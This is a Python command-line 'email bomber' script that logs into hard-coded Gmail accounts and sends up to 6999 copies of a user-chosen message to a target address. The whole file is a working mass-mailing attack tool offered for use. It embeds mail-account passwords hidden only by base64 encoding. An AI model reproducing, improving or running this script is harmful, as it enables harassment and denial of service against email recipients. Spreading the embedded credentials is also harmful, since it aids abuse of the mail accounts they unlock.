import random
import smtplib
import time
import os
import getpass
import sys
import base64

# gmail   : port = 587 , smtp_server = smtp.gmail.com
# outlook : port = 465 , smtp_server = smtp-mail.outlook.com
# yahoo   : port = 587 , smtp_server = smpt.mail.yahoo.com
# hotmail : port = 587 , smtp_server = smtp-mail.outlook.com
# MailRu  : port = 587 , smtp_server = smtp.mail.ru
# Yandex  : port = 465 , smtp_server = smtp.yandex.ru

GMAIL_PORT = "587"
YAHOO_PORT = "587"
OUTLOOK_PORT = "587"
YANDEX_PORT = "465"

subject = ""
body = "This is spam!"
server = "gmail"

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	
class FG:
    	black = "\033[30m"
    	red = "\033[31m"
    	green = "\033[32m"
    	orange = "\033[33m"
    	blue = "\033[34m"
    	purple = "\033[35m"
    	cyan = "\033[36m"
    	lightgrey = "\033[37m"
    	darkgrey = "\033[90m"
    	lightred = "\033[91m"
    	lightgreen = "\033[92m"
    	yellow = "\033[93m"
    	lightblue = "\033[94m"
    	pink = "\033[95m"
    	lightcyan = "\033[96m"

def start_bomb():
	os.system('clear')
	print(bcolors.OKGREEN + '''                            																											
[>] Preparing and attacking ...''')

os.system('clear')
print(bcolors.OKGREEN + '''

▓█████  ███▄ ▄███▓ ▄▄▄       ██▓  ██▓      ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒ ▓██▒    ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒ ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░ ▒██░      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██
░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░ ░██████▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░  ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
 ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░  ░ ▒  ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
   ░   ░      ░     ░   ▒    ▒ ░  ░  ░   ░  ░  ░  ░░         ░   ▒   ░      ░
   ░  ░       ░         ░  ░ ░       ░  ░      ░                 ░  ░       ░''')

print(bcolors.WARNING + '''												       
\033[95mSelect Mail Service:													
[1] Gmail/MailRu  -  powered google            By mishakorzik						
[2] Yahoo/Yahoo    -  powered microsoft         Version 1.1.27
[3] Outlook/Hotmail -  powered microsoft         Copyring © 2021
[4] Rambler/Aol      -  powered rambler/aol       Tranks for install''')

try:
	server = input(bcolors.WARNING + 'Mail Server: ' + bcolors.ENDC)
	user_list = ['smtp0python@gmail.com', 'smtp1python@gmail.com', 'smtp2python@gmail.com', 'smtp3python@gmail.com', 'smtp4python@gmail.com', 'smtp5python@gmail.com', 'smtp6python@gmail.com', 'smtp7python@gmail.com']
	user = random.choice(user_list)
	if user == 'smtp3python@gmail.com' or user == 'smtp4python@gmail.com':
		base64_message = 'c210cDAwMHB5dGhvbjFnbWFpbA=='
	else:
		base64_message = 'c210cDBweXRob24xOGdtYWls'
	base64_bytes = base64_message.encode('ascii')
	message_bytes = base64.b64decode(base64_bytes)
	pwd = message_bytes.decode('ascii')
	to = input(bcolors.OKGREEN + 'Send To: ' + bcolors.ENDC)
	subject = input(bcolors.LITBU + 'Subject: ' + bcolors.ENDC)
	body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
	nomes = int(input(bcolors.OKGREEN + 'Number of Emails to send (1-6999): ' + bcolors.ENDC))
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
	sys.exit()


	
#Gmail powered google
if server == '1' or server == '01' or server == '2' or server == '02' or server == '3' or server == '03' or server == '4' or server == '04' or server == 'gmail' or server == 'Gmail' or server == 'mailru' or server == 'Mailru' or server == 'outlook' or server == 'Outlook' or server == 'yahoo' or server == 'Yahoo' or server == 'rambler' or server == 'Rambler' or server == 'aol' or server == 'Aol':
	start_bomb()
	print(bcolors.WARNING + 'Email: ' + user + '  Target: ' + to)
	server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		sys.exit()
	for i in range(1, nomes+1):
		try:
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
			no += 1
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nTerminaling...' + bcolors.ENDC)
			sys.exit()
		except:
			print(bcolors.FAIL + "Messange failed to Send! ")
	server.close()
else:
        print('Works only with Gmail, MailRU, Yahoo, Outlook and Hotmail.')
        sys.exit()


